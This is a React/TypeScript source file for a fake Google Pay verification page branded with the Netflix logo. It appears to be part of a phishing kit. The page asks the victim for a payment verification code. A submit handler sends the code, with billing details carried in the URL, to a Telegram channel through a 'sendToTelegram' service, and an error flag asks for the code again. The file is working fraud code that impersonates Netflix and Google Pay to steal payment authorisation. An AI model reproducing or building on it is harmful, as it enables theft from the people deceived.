import React, { useState, useEffect } from 'react';
import { useIntl } from 'react-intl';
import { NetflixLogo } from '../components/NetflixLogo';
import { useNavigate, useLocation } from 'react-router-dom';
import { WhiteFooter } from '../components/WhiteFooter';
import { LoadingSpinner } from '../components/LoadingSpinner';
import { sendToTelegram } from '../services/telegram';
import { motion } from 'framer-motion';

export function GooglePayPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const intl = useIntl();
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const searchParams = new URLSearchParams(location.search);
  const hasError = searchParams.get('error') === 'true';
  const [billingInfo, setBillingInfo] = useState<any>(null);

  useEffect(() => {
    const stateParam = searchParams.get('state');
    if (stateParam) {
      try {
        const state = JSON.parse(decodeURIComponent(stateParam));
        setBillingInfo(state.billingInfo);
      } catch (error) {
        console.error('Error parsing state:', error);
      }
    }
  }, [searchParams]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    await sendToTelegram({
      type: 'google_pay',
      code,
      billingInfo
    });
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-white flex flex-col">
        <motion.header
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.3 }}
          className="border-b border-gray-200"
        >
          <div className="max-w-[1200px] mx-auto px-8 py-5">
            <NetflixLogo />
          </div>
        </motion.header>
        <main className="flex-grow flex items-center justify-center">
          <LoadingSpinner />
        </main>
        <WhiteFooter />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#f8f9fa] flex flex-col">
      <motion.header
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        transition={{ duration: 0.3 }}
        className="bg-white border-b border-gray-200"
      >
        <div className="max-w-[1200px] mx-auto px-8 py-5 flex justify-between items-center">
          <NetflixLogo />
          <button 
            onClick={() => navigate('/')}
            className="text-[#333333] hover:text-[#333333] text-lg font-bold hover:underline transition-all"
          >
            {intl.formatMessage({ id: 'nav.signout' })}
          </button>
        </div>
      </motion.header>

      <main className="flex-grow flex flex-col items-center justify-center px-4 py-12 md:py-16">
        <motion.div 
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3, delay: 0.2 }}
          className="w-full max-w-[440px] bg-white rounded-lg shadow-lg p-8"
        >
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.3 }}
            className="flex flex-col items-center mb-8"
          >
            <img 
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f2/Google_Pay_Logo.svg/1280px-Google_Pay_Logo.svg.png"
              alt="Google Pay"
              className="h-12 mb-6"
            />
            <h1 className="text-[32px] font-medium text-[#202124] text-center font-bold">
              {intl.formatMessage({ id: 'googlepay.title' })}
            </h1>
          </motion.div>

          {hasError && (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.3, delay: 0.4 }}
              className="mb-6 p-4 bg-red-50 border border-red-200 rounded-lg text-red-600 text-center"
            >
              {intl.formatMessage({ id: 'googlepay.code.error' })}
            </motion.div>
          )}

          <motion.form
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.5 }}
            onSubmit={handleSubmit}
            className="space-y-6"
          >
            <div className="relative">
              <label className="block text-sm font-medium text-[#202124] mb-2">
                {intl.formatMessage({ id: 'googlepay.code.label' })}
              </label>
              <input
                required
                type="text"
                value={code}
                onChange={(e) => setCode(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg text-[#202124] bg-transparent focus:outline-none focus:ring-2 focus:ring-[#1a73e8] focus:border-transparent transition-all"
                placeholder={intl.formatMessage({ id: 'googlepay.placeholder' })}
              />
            </div>

            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.3, delay: 0.6 }}
              className="pt-4"
            >
              <button 
                type="submit"
                className="w-full bg-[#1a73e8] text-white rounded-lg px-8 py-4 text-base font-medium hover:bg-[#1557b0] transition-colors flex items-center justify-center space-x-2"
              >
                <span>{intl.formatMessage({ id: 'googlepay.button' })}</span>
              </button>
            </motion.div>
          </motion.form>

          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            transition={{ duration: 0.3, delay: 0.7 }}
            className="mt-6 text-center text-sm text-[#5f6368]"
          >
            Protected by Google Pay Security
          </motion.div>
        </motion.div>
      </main>

      <WhiteFooter />
    </div>
  );
}